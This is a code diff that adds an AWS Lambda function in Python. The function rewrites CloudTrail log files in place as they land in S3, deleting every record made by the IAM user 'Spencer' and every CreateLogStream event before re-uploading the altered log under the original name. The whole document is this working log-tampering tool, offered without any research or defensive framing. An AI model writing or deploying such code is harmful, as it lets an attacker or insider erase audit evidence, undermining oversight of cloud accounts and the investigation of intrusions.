@@ -1,0 +1,26 @@
+import boto3, json, os, gzip
+def lambda_handler(event, context):
+    for record in event['Records']:
+        bucket = record['s3']['bucket']['name']
+        key = record['s3']['object']['key']
+        if 'AWSLogs' in key and 'CloudTrail' in key:
+            try:
+                os.makedirs('/tmp/{}'.format('/'.join(key.split('/')[:-1])))
+            except:
+                pass
+            client = boto3.resource('s3')
+            client.meta.client.download_file(bucket, key, '/tmp/{}'.format(key))
+            with open('/tmp/{}'.format(key), 'rb') as f:
+                logs = json.loads(gzip.decompress(f.read()).decode('utf-8'))
+            new_logs = {'Records': []}
+            for log_record in logs['Records']:
+                if log_record['eventName'] == 'CreateLogStream':
+                    continue
+                if 'userName' in log_record['userIdentity'] and log_record['userIdentity']['userName'] == 'Spencer':
+                    continue
+                new_logs['Records'].append(log_record)
+            with open('/tmp/{}'.format(key), 'wb+') as f:
+                f.write(gzip.compress(json.dumps(new_logs).encode()))
+            if len(logs['Records']) > len(new_logs['Records']):
+                client.meta.client.upload_file('/tmp/{}'.format(key), bucket, key)
+    return
